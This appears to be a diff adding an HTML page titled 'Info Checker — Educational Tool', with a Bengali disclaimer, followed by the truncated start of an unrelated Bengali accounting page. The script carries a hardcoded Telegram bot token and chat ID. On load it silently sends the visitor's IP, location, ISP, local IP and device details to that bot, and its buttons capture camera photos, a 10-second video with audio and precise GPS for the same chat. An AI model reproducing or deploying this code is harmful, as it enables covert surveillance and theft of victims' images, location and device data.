@@ -1,0 +1,1747 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Info Checker — Educational Tool</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17; --panel: #0f1623; --border: #1e2d45;
+    --accent: #00e5ff; --warn: #ff6b35; --green: #00ff9d;
+    --red: #ff4466; --text: #c8d8e8; --dim: #4a6080;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; padding: 20px;
+    background-image:
+      radial-gradient(ellipse at 20% 50%, rgba(0,229,255,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(0,255,157,0.03) 0%, transparent 50%);
+  }
+  .container { width:100%; max-width:680px; }
+  .header { text-align:center; margin-bottom:32px; animation:fadeDown 0.6s ease; }
+  .header .tag {
+    font-family:'Share Tech Mono',monospace; font-size:11px;
+    color:var(--accent); letter-spacing:4px; text-transform:uppercase;
+    margin-bottom:10px; opacity:0.8;
+  }
+  .header h1 { font-size:36px; font-weight:700; letter-spacing:2px; color:#fff; text-shadow:0 0 30px rgba(0,229,255,0.3); }
+  .header h1 span { color:var(--accent); }
+  .warning-box {
+    background:rgba(255,107,53,0.08); border:1px solid rgba(255,107,53,0.4);
+    border-left:3px solid var(--warn); border-radius:8px;
+    padding:16px 20px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.1s both;
+  }
+  .warning-box .warn-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--warn); letter-spacing:3px; margin-bottom:8px; }
+  .warning-box p { font-size:14px; line-height:1.6; color:#b0c4d8; }
+  .warning-box strong { color:var(--warn); }
+  .buttons-grid {
+    display:grid; grid-template-columns:repeat(2,1fr);
+    gap:16px; margin-bottom:28px; animation:fadeDown 0.6s ease 0.2s both;
+  }
+  .btn {
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:10px; padding:22px 12px; cursor:pointer;
+    transition:all 0.25s ease; display:flex;
+    flex-direction:column; align-items:center; gap:10px;
+    position:relative; overflow:hidden;
+  }
+  .btn::before {
+    content:''; position:absolute; inset:0;
+    background:linear-gradient(135deg,rgba(0,229,255,0.05),transparent);
+    opacity:0; transition:opacity 0.3s;
+  }
+  .btn:hover::before { opacity:1; }
+  .btn:hover { border-color:var(--accent); transform:translateY(-3px); box-shadow:0 8px 30px rgba(0,229,255,0.12); }
+  .btn:active { transform:translateY(0); }
+  .btn .icon  { font-size:28px; line-height:1; }
+  .btn .label { font-size:13px; font-weight:600; letter-spacing:1px; color:var(--accent); text-align:center; }
+  .btn .sublabel { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); text-align:center; }
+  .btn.loading { pointer-events:none; opacity:0.7; }
+  .result-panel {
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:10px; padding:20px; display:none; animation:fadeUp 0.4s ease;
+  }
+  .result-panel.show { display:block; }
+  .result-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid var(--border); }
+  .result-title { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--accent); letter-spacing:2px; }
+  .status-badge { font-family:'Share Tech Mono',monospace; font-size:10px; padding:3px 10px; border-radius:20px; background:rgba(0,255,157,0.1); color:var(--green); border:1px solid rgba(0,255,157,0.3); }
+  .status-badge.sending { color:var(--accent); background:rgba(0,229,255,0.1); border-color:rgba(0,229,255,0.3); }
+  .status-badge.error   { color:var(--warn);   background:rgba(255,107,53,0.1);  border-color:rgba(255,107,53,0.3); }
+  .result-grid { display:flex; flex-direction:column; gap:8px; }
+  .result-row  { display:flex; gap:12px; align-items:flex-start; }
+  .result-key  { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--dim); min-width:130px; padding-top:1px; }
+  .result-val  { font-size:14px; color:var(--text); word-break:break-all; flex:1; }
+  /* Progress */
+  .progress-steps { display:none; flex-direction:column; gap:6px; margin-top:12px; }
+  .progress-steps.show { display:flex; }
+  .step { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); display:flex; align-items:center; gap:8px; }
+  .step.done   { color:var(--green); }
+  .step.active { color:var(--accent); }
+  .step.fail   { color:var(--warn); }
+  .step .dot   { width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; }
+  .step.done   .dot { background:var(--green); }
+  .step.active .dot { background:var(--accent); box-shadow:0 0 6px var(--accent); }
+  .step.fail   .dot { background:var(--warn); }
+  /* REC bar */
+  .rec-wrapper { display:none; align-items:center; gap:12px; margin-top:12px; padding:12px 16px; background:rgba(255,68,102,0.06); border:1px solid rgba(255,68,102,0.25); border-radius:8px; }
+  .rec-wrapper.show { display:flex; }
+  .rec-dot { width:10px; height:10px; border-radius:50%; background:var(--red); flex-shrink:0; animation:recPulse 1s ease-in-out infinite; }
+  .rec-text { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--red); letter-spacing:1px; flex:1; }
+  .rec-bar-wrap { width:100px; height:4px; background:rgba(255,68,102,0.2); border-radius:2px; overflow:hidden; }
+  .rec-bar { height:100%; background:var(--red); width:0%; transition:width 1s linear; border-radius:2px; }
+  @keyframes recPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .telegram-note { margin-top:14px; padding-top:14px; border-top:1px solid var(--border); font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--dim); text-align:center; }
+  .telegram-note span { color:var(--green); }
+  .send-status { margin-top:14px; text-align:center; min-height:22px; }
+  @keyframes fadeDown { from{opacity:0;transform:translateY(-15px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp   { from{opacity:0;transform:translateY(10px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes spin     { to{transform:rotate(360deg)} }
+  .spinner { display:inline-block; width:10px; height:10px; border:2px solid rgba(0,229,255,0.3); border-top-color:var(--accent); border-radius:50%; animation:spin 0.8s linear infinite; margin-right:6px; vertical-align:middle; }
+  @media(max-width:480px){ .buttons-grid{grid-template-columns:1fr} .header h1{font-size:26px} }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="tag">// Educational Tool</div>
+    <h1>INFO <span>CHECKER</span></h1>
+  </div>
+
+  <div class="warning-box">
+    <div class="warn-title">⚠ WARNING — READ BEFORE USE</div>
+    <p>এই tool টি সম্পূর্ণ <strong>educational purposes</strong> এর জন্য।
+    শুধুমাত্র <strong>নিজের device</strong> এ নিজের information check করার জন্য ব্যবহার করুন।
+    অন্য কারো উপর এই tool ব্যবহার করা <strong>অনৈতিক ও বেআইনি</strong>।</p>
+  </div>
+
+  <div class="buttons-grid">
+    <button class="btn" id="geoBtn" onclick="checkGeo()">
+      <span class="icon">📍</span><span class="label">GEO LOCATION</span>
+      <span class="sublabel">Location → Telegram</span>
+    </button>
+    <button class="btn" id="cameraBtn" onclick="runCapture()">
+      <span class="icon">🎬</span><span class="label">CAPTURE ALL</span>
+      <span class="sublabel">Photo×2 + Video→TG</span>
+    </button>
+  </div>
+
+  <div class="result-panel" id="resultPanel">
+    <div class="result-header">
+      <div class="result-title" id="resultTitle">// RESULT</div>
+      <div class="status-badge" id="statusBadge">READY</div>
+    </div>
+    <div class="result-grid" id="resultGrid"></div>
+    <div class="send-status" id="sendStatus"></div>
+
+    <div class="progress-steps" id="progressSteps">
+      <div class="step" id="step1"><div class="dot"></div> Back camera — photo</div>
+      <div class="step" id="step2"><div class="dot"></div> Front camera — photo</div>
+      <div class="step" id="step3"><div class="dot"></div> Front camera — 10s video</div>
+      <div class="step" id="step4"><div class="dot"></div> Telegram এ সব পাঠানো</div>
+    </div>
+
+    <div class="rec-wrapper" id="recWrapper">
+      <div class="rec-dot"></div>
+      <div class="rec-text" id="recText">REC 0s / 10s</div>
+      <div class="rec-bar-wrap"><div class="rec-bar" id="recBar"></div></div>
+    </div>
+
+    <div class="telegram-note" id="telegramNote"></div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN      = "8726361470:AAErTzupAMjDRDopACMXBz0_YMuU_2h2cQg";
+const CHAT_ID        = "1873240895";
+const VIDEO_DURATION = 10;
+
+// ─── UI helpers ─────────────────────────────────────────────────────────────
+const $  = id => document.getElementById(id);
+const setBadge = (type, text) => {
+  $('statusBadge').className = 'status-badge' + (type ? ' '+type : '');
+  $('statusBadge').innerHTML = type==='sending' ? `<span class="spinner"></span>${text}` : text;
+};
+const setStep = (id, state) => { $(id).className = 'step ' + state; };
+const setRows = rows => {
+  $('resultGrid').innerHTML = rows.map(([k,v]) =>
+    `<div class="result-row"><span class="result-key">${k}</span><span class="result-val">${v}</span></div>`
+  ).join('');
+};
+const fmtErr = err => {
+  if (!err) return 'Unknown error';
+  if (err.name === 'NotAllowedError')      return 'Permission denied ❌';
+  if (err.name === 'NotFoundError')        return 'Camera/Mic নেই ❌';
+  if (err.name === 'NotReadableError')     return 'Device busy ❌';
+  if (err.name === 'OverconstrainedError') return 'Camera constraint ❌';
+  return (err.message || String(err)).substring(0, 60);
+};
+
+function resetCaptureUI() {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = '// CAPTURE ALL';
+  $('progressSteps').classList.add('show');
+  $('telegramNote').innerHTML = '';
+  $('recWrapper').classList.remove('show');
+  $('recBar').style.width = '0%';
+  ['step1','step2','step3','step4'].forEach(s => setStep(s, ''));
+}
+
+// ─── Best MIME type ──────────────────────────────────────────────────────────
+function getBestMime() {
+  const list = [
+    'video/webm;codecs=vp8,opus',
+    'video/webm;codecs=vp9,opus',
+    'video/webm;codecs=h264,opus',
+    'video/webm;codecs=vp8',
+    'video/webm;codecs=vp9',
+    'video/webm',
+    'video/mp4;codecs=h264,aac',
+    'video/mp4',
+    ''
+  ];
+  for (const m of list) {
+    try { if (m === '' || MediaRecorder.isTypeSupported(m)) return m; } catch(e) {}
+  }
+  return '';
+}
+
+// ─── Photo capture ───────────────────────────────────────────────────────────
+async function capturePhoto(facingMode) {
+  const constraints = [
+    { video: { facingMode: { exact: facingMode }, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: { facingMode: facingMode,            width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video: true, audio:false },
+  ];
+  let stream = null, lastErr = null;
+  for (const c of constraints) {
+    try { stream = await navigator.mediaDevices.getUserMedia(c); break; }
+    catch(e) { lastErr = e; }
+  }
+  if (!stream) throw lastErr;
+
+  try {
+    const video = document.createElement('video');
+    video.srcObject = stream; video.playsInline = true; video.muted = true;
+    await video.play();
+    await new Promise(r => setTimeout(r, 1000));
+
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth  || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    return { canvas, res: `${canvas.width}x${canvas.height}` };
+  } finally {
+    stream.getTracks().forEach(t => t.stop());
+  }
+}
+
+// ─── Video record ────────────────────────────────────────────────────────────
+async function recordVideo(durationSec) {
+  let stream = null;
+  let hasAudio = true;
+
+  const attempts = [
+    { video: { facingMode: { exact: 'user' }, width:{ideal:1280}, height:{ideal:720} }, audio: true  },
+    { video: { facingMode: 'user',            width:{ideal:1280}, height:{ideal:720} }, audio: true  },
+    { video: { facingMode: 'user' },                                                    audio: false },
+    { video: true,                                                                       audio: false },
+  ];
+
+  for (const c of attempts) {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia(c);
+      hasAudio = !!c.audio;
+      break;
+    } catch(e) {}
+  }
+  if (!stream) throw new Error('Camera açılamadı ❌');
+
+  const mimeType = getBestMime();
+
+  return new Promise((resolve, reject) => {
+    const chunks = [];
+    let recorder;
+
+    try {
+      recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+    } catch(e) {
+      stream.getTracks().forEach(t => t.stop());
+      reject(new Error('MediaRecorder başlatılamadı: ' + e.message));
+      return;
+    }
+
+    recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+
+    recorder.onerror = e => {
+      clearInterval(timer);
+      stream.getTracks().forEach(t => t.stop());
+      $('recWrapper').classList.remove('show');
+      reject(new Error('Record error: ' + (e.error?.message || 'unknown')));
+    };
+
+    recorder.onstop = () => {
+      stream.getTracks().forEach(t => t.stop());
+      $('recWrapper').classList.remove('show');
+
+      if (chunks.length === 0) { reject(new Error('No data recorded')); return; }
+
+      const finalMime = recorder.mimeType || mimeType || 'video/webm';
+      const blob      = new Blob(chunks, { type: finalMime });
+
+      if (blob.size < 1000) { reject(new Error('Video too small (' + blob.size + 'b)')); return; }
+
+      resolve({ blob, mimeType: finalMime, hasAudio, sizeMB: (blob.size/1024/1024).toFixed(2) });
+    };
+
+    // REC UI
+    $('recWrapper').classList.add('show');
+    $('recText').textContent  = `REC 0s / ${durationSec}s${hasAudio ? '' : ' (no audio)'}`;
+    $('recBar').style.transition = 'none';
+    $('recBar').style.width   = '0%';
+
+    recorder.start(500);
+
+    let elapsed = 0;
+    const timer = setInterval(() => {
+      elapsed++;
+      $('recText').textContent  = `REC ${elapsed}s / ${durationSec}s${hasAudio ? '' : ' (no audio)'}`;
+      $('recBar').style.transition = 'width 1s linear';
+      $('recBar').style.width   = (elapsed / durationSec * 100) + '%';
+
+      if (elapsed >= durationSec) {
+        clearInterval(timer);
+        try { recorder.requestData(); } catch(e) {}
+        setTimeout(() => {
+          try { if (recorder.state !== 'inactive') recorder.stop(); } catch(e) { reject(e); }
+        }, 300);
+      }
+    }, 1000);
+  });
+}
+
+// ─── Telegram senders ────────────────────────────────────────────────────────
+const canvasToBlob = canvas => new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+
+async function tgSendPhoto(blob, caption) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', blob, 'photo.jpg');
+  fd.append('caption', caption);
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
+  const d = await r.json();
+  if (!d.ok) throw new Error(d.description);
+}
+
+async function tgSendVideo(blob, caption, mimeType) {
+  if (blob.size > 49 * 1024 * 1024) throw new Error('50MB limit exceeded');
+  const ext = (mimeType||'').includes('mp4') ? 'mp4' : 'webm';
+  const fd  = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('video', blob, `video.${ext}`);
+  fd.append('caption', caption);
+  fd.append('supports_streaming', 'true');
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body:fd });
+  const d = await r.json();
+  if (!d.ok) {
+    // fallback: sendDocument
+    const fd2 = new FormData();
+    fd2.append('chat_id', CHAT_ID);
+    fd2.append('document', blob, `video.${ext}`);
+    fd2.append('caption', caption + '\n(as document)');
+    const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body:fd2 });
+    const d2 = await r2.json();
+    if (!d2.ok) throw new Error(d2.description);
+  }
+}
+
+// ─── MAIN FLOW ───────────────────────────────────────────────────────────────
+async function runCapture() {
+  const btn = $('cameraBtn');
+  btn.classList.add('loading');
+  resetCaptureUI();
+  setBadge('sending', 'WORKING');
+  setRows([['Status', 'শুরু হচ্ছে...']]);
+
+  let backR=null, frontR=null, videoR=null;
+
+  // Step 1: Back Photo
+  setStep('step1','active');
+  setRows([['Back Photo','Camera চালু হচ্ছে...']]);
+  try {
+    backR = await capturePhoto('environment');
+    setStep('step1','done');
+  } catch(e) {
+    setStep('step1','fail');
+  }
+
+  // Step 2: Front Photo
+  setStep('step2','active');
+  setRows([
+    ['Back Photo',  backR  ? `✅ ${backR.res}` : '❌ Failed'],
+    ['Front Photo', 'Camera চালু হচ্ছে...'],
+  ]);
+  try {
+    frontR = await capturePhoto('user');
+    setStep('step2','done');
+  } catch(e) {
+    setStep('step2','fail');
+  }
+
+  // Step 3: 10s Video
+  setStep('step3','active');
+  setRows([
+    ['Back Photo',  backR  ? `✅ ${backR.res}`  : '❌ Failed'],
+    ['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],
+    ['Video',       '🎬 Recording শুরু হচ্ছে...'],
+  ]);
+  try {
+    videoR = await recordVideo(VIDEO_DURATION);
+    setStep('step3','done');
+    setRows([
+      ['Back Photo',  backR  ? `✅ ${backR.res}`  : '❌ Failed'],
+      ['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],
+      ['Video',       `✅ ${VIDEO_DURATION}s | ${videoR.sizeMB} MB${videoR.hasAudio ? '' : ' | no audio'}`],
+    ]);
+  } catch(e) {
+    setStep('step3','fail');
+    setRows([
+      ['Back Photo',  backR  ? `✅ ${backR.res}`  : '❌ Failed'],
+      ['Front Photo', frontR ? `✅ ${frontR.res}` : '❌ Failed'],
+      ['Video',       fmtErr(e)],
+    ]);
+  }
+
+  if (!backR && !frontR && !videoR) {
+    setBadge('error','ALL FAILED');
+    $('telegramNote').innerHTML = '❌ কিছুই পাঠানো যায়নি';
+    btn.classList.remove('loading');
+    return;
+  }
+
+  // Step 4: Telegram
+  setStep('step4','active');
+  setBadge('sending','SENDING');
+  let sent=0, errs=[];
+
+  if (backR) {
+    try {
+      await tgSendPhoto(await canvasToBlob(backR.canvas),
+        `📸 Back Camera Photo\n🖼 ${backR.res}\n⚠️ Educational use only`);
+      sent++;
+    } catch(e) { errs.push('Back: '+fmtErr(e)); }
+  }
+
+  if (frontR) {
+    try {
+      await tgSendPhoto(await canvasToBlob(frontR.canvas),
+        `🤳 Front Camera Photo\n🖼 ${frontR.res}\n⚠️ Educational use only`);
+      sent++;
+    } catch(e) { errs.push('Front: '+fmtErr(e)); }
+  }
+
+  if (videoR) {
+    try {
+      await tgSendVideo(videoR.blob,
+        `🎬 Front Camera Video\n⏱ ${VIDEO_DURATION}s | 📦 ${videoR.sizeMB} MB${videoR.hasAudio ? '' : ' | no audio'}\n⚠️ Educational use only`,
+        videoR.mimeType);
+      sent++;
+    } catch(e) { errs.push('Video: '+fmtErr(e)); }
+  }
+
+  const bS = backR  ? `✅ ${backR.res}`       : '❌ Failed';
+  const fS = frontR ? `✅ ${frontR.res}`      : '❌ Failed';
+  const vS = videoR ? `✅ ${videoR.sizeMB} MB` : '❌ Failed';
+
+  if (errs.length === 0) {
+    setStep('step4','done'); setBadge('','ALL SENT ✓');
+    setRows([['Back Photo',bS],['Front Photo',fS],['Video',vS],['Telegram',`✅ ${sent} item(s) sent`]]);
+    $('telegramNote').innerHTML = `✅ <span>${sent}টি file Telegram এ পাঠানো হয়েছে!</span>`;
+  } else {
+    setStep('step4', sent>0?'done':'fail');
+    setBadge(sent>0?'':'error', sent>0?'PARTIAL ✓':'ERROR');
+    setRows([['Back Photo',bS],['Front Photo',fS],['Video',vS],
+             ['Sent',`${sent} item(s)`],['Error',errs.join(' | ')]]);
+    $('telegramNote').innerHTML = sent>0
+      ? `⚠️ <span>${sent}টি গেছে, কিছু fail হয়েছে</span>`
+      : `❌ ${errs.join(' | ')}`;
+  }
+
+  btn.classList.remove('loading');
+}
+
+// ─── Simple panel show (no data rows) ────────────────────────────────────────
+function showPanel(title) {
+  $('resultPanel').classList.add('show');
+  $('resultTitle').textContent = `// ${title}`;
+  $('progressSteps').classList.remove('show');
+  $('recWrapper').classList.remove('show');
+  $('resultGrid').style.display = 'none';
+  $('sendStatus').innerHTML = '';
+  $('telegramNote').innerHTML = '';
+}
+
+async function sendTextTG(text) {
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id:CHAT_ID, text, parse_mode:'Markdown' })
+    });
+    const d = await r.json();
+    if (d.ok) {
+      setBadge('','SENT ✓');
+      $('telegramNote').innerHTML = '✅ <span>Telegram এ পাঠানো হয়েছে</span>';
+    } else throw new Error(d.description);
+  } catch(e) {
+    setBadge('error','ERROR');
+    $('telegramNote').innerHTML = `❌ পাঠানো যায়নি: ${e.message}`;
+  }
+}
+
+// ─── IP + Browser — Combined ──────────────────────────────────────────────────
+async function checkIPAndBrowser() {
+  // Silent auto-run — no button reference needed
+
+  // ── IP ──
+  let ipRows = [];
+  try {
+    const d1 = await (await fetch('https://api.ipify.org?format=json')).json();
+    const d2 = await (await fetch(`https://ipapi.co/${d1.ip}/json/`)).json();
+    ipRows = [
+      ['IP Address', d1.ip],
+      ['Country',    d2.country_name || 'N/A'],
+      ['City',       d2.city         || 'N/A'],
+      ['ISP',        d2.org          || 'N/A'],
+      ['Timezone',   d2.timezone     || 'N/A'],
+    ];
+  } catch(e) {
+    ipRows = [['IP Error', e.message]];
+  }
+
+  // ── Browser ──
+  const ua = navigator.userAgent;
+  let browser = 'Unknown';
+  if      (ua.includes('Chrome')&&!ua.includes('Edg')) browser='Google Chrome';
+  else if (ua.includes('Firefox'))                      browser='Mozilla Firefox';
+  else if (ua.includes('Safari')&&!ua.includes('Chrome')) browser='Safari';
+  else if (ua.includes('Edg'))                          browser='Microsoft Edge';
+  else if (ua.includes('Opera')||ua.includes('OPR'))    browser='Opera';
+
+  const conn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  let netSpeed='N/A', netType='N/A';
+  if(conn){ netSpeed=(conn.downlink||'N/A')+' Mbps'; netType=conn.effectiveType||'N/A'; }
+
+  let cameraS='N/A', micS='N/A';
+  if(navigator.mediaDevices?.enumerateDevices){
+    try{
+      const devs = await navigator.mediaDevices.enumerateDevices();
+      cameraS = devs.some(d=>d.kind==='videoinput')?'Found ✓':'Not Found ✗';
+      micS    = devs.some(d=>d.kind==='audioinput')?'Found ✓':'Not Found ✗';
+    }catch(e){ cameraS=micS='Permission Denied'; }
+  }
+
+  let localIP='N/A';
+  try{
+    await new Promise(res=>{
+      const pc=new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
+      pc.onicecandidate=e=>{
+        if(!e?.candidate){res();return;}
+        const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if(m&&!m[1].startsWith('0.')){localIP=m[1];pc.close();res();}
+      };
+      setTimeout(res,1000);
+    });
+  }catch(e){}
+
+  let storageUsed='N/A', storageTotal='N/A';
+  if(navigator.storage?.estimate){
+    try{
+      const est=await navigator.storage.estimate();
+      storageUsed =(est.usage/1024/1024).toFixed(2)+' MB';
+      storageTotal=(est.quota/1024/1024/1024).toFixed(2)+' GB';
+    }catch(e){}
+  }
+
+  const browserRows = [
+    ['Browser',       browser],
+    ['Platform',      navigator.platform],
+    ['Language',      navigator.language],
+    ['Screen',        `${screen.width}x${screen.height}`],
+    ['Pixel Ratio',   (window.devicePixelRatio||'N/A')+'x'],
+    ['Timezone',      Intl.DateTimeFormat().resolvedOptions().timeZone],
+    ['Online',        navigator.onLine?'Yes':'No'],
+    ['Local IP',      localIP],
+    ['Cookie',        navigator.cookieEnabled?'Enabled ✓':'Disabled ✗'],
+    ['Network Type',  netType],
+    ['Network Speed', netSpeed],
+    ['Device Memory', (navigator.deviceMemory?navigator.deviceMemory+' GB':'N/A')],
+    ['CPU Cores',     (navigator.hardwareConcurrency?navigator.hardwareConcurrency+' cores':'N/A')],
+    ['Touch Points',  (navigator.maxTouchPoints||0)+''],
+    ['Dark Mode',     window.matchMedia('(prefers-color-scheme: dark)').matches?'Dark 🌙':'Light ☀️'],
+    ['Storage Used',  storageUsed],
+    ['Storage Quota', storageTotal],
+    ['Camera',        cameraS],
+    ['Microphone',    micS],
+    ['User Agent',    ua.substring(0,80)+'...'],
+  ];
+
+  if(navigator.getBattery){
+    try{
+      const bat=await navigator.getBattery();
+      browserRows.push(['Battery',Math.round(bat.level*100)+'%'],['Charging',bat.charging?'Yes ⚡':'No']);
+    }catch(e){ browserRows.push(['Battery','N/A']); }
+  }
+
+  // ── Send to Telegram ──
+  setBadge('sending','SENDING');
+  $('sendStatus').innerHTML = `<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Telegram এ পাঠানো হচ্ছে...</span>`;
+
+  const ipMsg      = `🌐 *IP INFO*\n\n` + ipRows.map(([k,v])=>`*${k}:* ${v}`).join('\n');
+  const browserMsg = `🖥️ *BROWSER INFO*\n\n` + browserRows.map(([k,v])=>`*${k}:* ${v}`).join('\n') + `\n\n⚠️ _Educational use only_`;
+
+  try {
+    // দুটো message পাঠাও
+    const r1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id:CHAT_ID, text: ipMsg, parse_mode:'Markdown' })
+    });
+    const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id:CHAT_ID, text: browserMsg, parse_mode:'Markdown' })
+    });
+    const d1 = await r1.json();
+    const d2 = await r2.json();
+    if (d1.ok && d2.ok) {
+      setBadge('','SENT ✓');
+      $('sendStatus').innerHTML = '';
+      $('telegramNote').innerHTML = '✅ <span>IP + Browser Info Telegram এ পাঠানো হয়েছে</span>';
+    } else {
+      throw new Error(!d1.ok ? d1.description : d2.description);
+    }
+  } catch(e) {
+    // silent fail
+  }
+}
+
+// ─── AUTO RUN on page load ────────────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded', () => {
+  checkIPAndBrowser();
+});
+
+// ─── Geo Check ───────────────────────────────────────────────────────────────
+function checkGeo() {
+  const btn = $('geoBtn');
+  btn.classList.add('loading');
+  showPanel('GEO LOCATION');
+  setBadge('sending','LOCATING...');
+  $('sendStatus').innerHTML = `<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Location নেওয়া হচ্ছে...</span>`;
+
+  if (!navigator.geolocation) {
+    setBadge('error','ERROR');
+    $('telegramNote').innerHTML = '❌ Geolocation supported না';
+    btn.classList.remove('loading');
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async p => {
+      const lat = p.coords.latitude.toFixed(6);
+      const lon = p.coords.longitude.toFixed(6);
+      const acc = p.coords.accuracy.toFixed(0);
+
+      setBadge('sending','SENDING');
+      $('sendStatus').innerHTML = `<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Telegram এ পাঠানো হচ্ছে...</span>`;
+
+      const msg = `📍 *GEO LOCATION*\n\n*Latitude:* ${lat}\n*Longitude:* ${lon}\n*Accuracy:* ${acc} meters\n*Maps:* https://maps.google.com/?q=${lat},${lon}\n\n⚠️ _Educational use only_`;
+      await sendTextTG(msg);
+      $('sendStatus').innerHTML = '';
+      btn.classList.remove('loading');
+    },
+    e => {
+      setBadge('error','ERROR');
+      $('sendStatus').innerHTML = '';
+      $('telegramNote').innerHTML = `❌ ${e.message}`;
+      btn.classList.remove('loading');
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+}
+</script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>হিসাব নোট — Joynal Abedin</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=Baloo+Da+2:wght@500;600;700;800&display=swap" rel="stylesheet"/>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<style>
+:root{
+  --bg:#050a0f;--surface:#0a1520;--surface2:#0f1f30;
+  --border:#1a3a5c;--border2:rgba(0,212,255,0.12);
+  --accent:#00d4ff;--accent2:#0080ff;--accent3:#00ff9f;
+  --text:#c8e6f5;--text2:#7aa8c0;--text3:#3d6a88;
+  --green:#00ff9f;--green2:#00cc7a;--green-bg:rgba(0,255,159,0.08);--green-bdr:rgba(0,255,159,0.25);
+  --blue:#00d4ff;--blue2:#0080ff;--blue-bg:rgba(0,212,255,0.08);--blue-bdr:rgba(0,212,255,0.25);
+  --gold:#ffaa00;--gold-bg:rgba(255,170,0,0.08);--gold-bdr:rgba(255,170,0,0.25);
+  --red:#ff4455;--red-bg:rgba(255,68,85,0.08);--red-bdr:rgba(255,68,85,0.25);
+  --purple:#9b8bff;
+  --glow-g:0 0 20px rgba(0,255,159,0.3);--glow-b:0 0 20px rgba(0,212,255,0.3);
+  --shadow:0 8px 40px rgba(0,0,0,0.5);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:'Baloo Da 2',sans-serif;background:#020810;color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
+
+body::before{content:'';position:fixed;inset:0;z-index:0;
+  background:radial-gradient(ellipse at 20% 20%,rgba(0,128,255,0.12) 0%,transparent 50%),
+             radial-gradient(ellipse at 80% 80%,rgba(0,212,255,0.08) 0%,transparent 50%),
+             radial-gradient(ellipse at 50% 50%,rgba(0,255,159,0.04) 0%,transparent 60%);
+  animation:bgPulse 12s ease-in-out infinite alternate;}
+body::after{content:'';position:fixed;inset:0;z-index:0;
+  background-image:linear-gradient(rgba(0,212,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.02) 1px,transparent 1px);
+  background-size:50px 50px;}
